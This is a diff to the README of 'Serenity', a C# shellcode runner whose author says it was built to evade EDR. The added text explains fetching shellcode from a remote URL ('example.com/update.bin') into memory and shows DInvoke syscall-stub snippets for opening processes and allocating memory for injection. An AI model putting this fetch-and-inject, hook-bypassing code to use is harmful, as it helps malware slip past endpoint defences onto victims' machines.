@@ -3,14 +3,20 @@ I stopped using this when APT-37 was observed [exploiting Internet Explorer](htt
 # Technical Info
 Serenity was a C# shellcode runner I made and used a few years ago to bypass EDR. It leverages DInvoke, a .NET library that will let you use direct system call invocation. EDR hooks traditional Windows API calls like ```OpenProcess```, ```VirtualAllocEx```, thus, DInvoke uses native system calls at runtime as an alternative.
 
-As an example, you can see this in action within this code snippet
+First and foremost, it utilizes ```HttpClient``` to fetch the shellcode from a remote URL, and stores it as a byte array in memory - which was better than on disk. However, if your domain didn't have good reputation, this entire process was burnt.
+```
+byte[] shellcode;
+using (var client = new HttpClient())
+{
+    shellcode = await client.GetByteArrayAsync("http://example.com/update.bin");
+}
+```
+The address of ```NtOpenProcess``` is dynamically resolved by ```Generic.GetSyscallStub()``` at runtime - which bypasses user-mode hooks.
 ```
 var ptr = Generic.GetSyscallStub("NtOpenProcess");
 var ntOpenProcess = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtOpenProcess)) 
     as Native.DELEGATES.NtOpenProcess;
 ```
-The address of ```NtOpenProcess``` is dynamically resolved by ```Generic.GetSyscallStub()``` at runtime - which bypasses user-mode hooks.
-
 Next, there's the memory allocation and injection
 ```
 var ptr = Generic.GetSyscallStub("NtAllocateVirtualMemory");
